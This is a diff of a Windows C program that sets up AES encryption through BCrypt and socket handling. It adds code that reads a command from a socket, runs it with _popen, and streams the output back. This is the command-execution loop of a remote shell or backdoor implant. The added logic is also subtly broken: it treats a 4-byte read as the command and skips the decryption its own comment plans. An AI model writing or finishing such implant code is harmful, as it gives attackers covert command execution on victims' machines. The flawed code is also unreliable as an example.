@@ -63,7 +63,7 @@ int main(){
     );
     if (!BCRYPT_SUCCESS(status)) {
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
-        return;
+        return 0;
     }
 
     status = BCryptGetProperty(
@@ -76,7 +76,7 @@ int main(){
     );
     if (!BCRYPT_SUCCESS(status)) {
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
-        return;
+        return 0;
     }
 
     //Allow memory
@@ -85,7 +85,7 @@ int main(){
 
     if (pbKeyObject == NULL) {
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
-        return;
+        return 0;
     }
 
     status = BCryptGenerateSymmetricKey(
@@ -100,7 +100,7 @@ int main(){
     if (!BCRYPT_SUCCESS(status)) {
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
-        return;
+        return 0;
     }
 
 
@@ -160,8 +160,19 @@ int main(){
         return 0;
     }
 
+
+
+
+    int checker;
     // TODO: add encrypted packet receive/decrypt, run command, encrypt/send loop using recv_all and send_all
-    recv_all(soc, &rcvbuffer, 4);
+    checker = recv_all(soc, rcvbuffer, 4);
+    if (checker <= 0) return 1; //error in recv_all
+    FILE *pipe = _popen(rcvbuffer, "r");
+    char buf[512];
+
+    while (fgets(buf, sizeof(buf), pipe) != NULL) {
+    send_all(soc, buf, (int)strlen(buf));
+    }
 
 
 
@@ -178,6 +189,7 @@ int main(){
     if (aesAlgorithm) {
         BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
     }
+    _pclose(pipe);
     return 0;
 }
 
